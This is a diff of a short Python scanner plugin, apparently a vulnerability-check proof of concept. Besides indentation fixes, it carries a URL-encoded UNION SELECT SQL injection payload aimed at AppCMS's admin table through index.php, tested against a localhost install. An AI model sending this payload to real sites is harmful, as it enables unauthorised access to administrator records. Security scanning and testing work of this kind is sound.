@@ -6,7 +6,7 @@
 
 def assign(service, arg):
     if service == 'appcms':
-	return True, arg
+        return True, arg
 
 def audit(arg):
     payload = "index.php?q=xxoo%27%20union%20select%20md5(1),2,3%20from%20appcms_admin_list%20where%20uid%20like%20%27"
@@ -16,5 +16,5 @@ def audit(arg):
         security_hole(target)
 
 if __name__ == '__main__':
-	from dummy import *
-	audit(assign('appcms', 'http://127.0.0.1/appcms-1.3.834/')[1])
+
+    audit(assign('appcms', 'http://127.0.0.1/appcms-1.3.834/')[1])
